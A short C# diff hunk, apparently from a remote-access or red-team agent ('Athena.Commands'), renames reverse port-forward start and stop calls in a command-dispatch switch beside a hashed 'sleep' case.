@@ -137,11 +137,11 @@ namespace Athena.Commands
 
                     if (dict["action"].ToLower() == "start")
                     {
-                        StartForwarder(this, new TaskEventArgs(job));
+                        StartRportFwd(this, new TaskEventArgs(job));
                         break;
                     }
 
-                    StopForwarder(this, new TaskEventArgs(job));  
+                    StopRportFwd(this, new TaskEventArgs(job));  
                     break;
                 case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
                     UpdateSleepAndJitter(job);
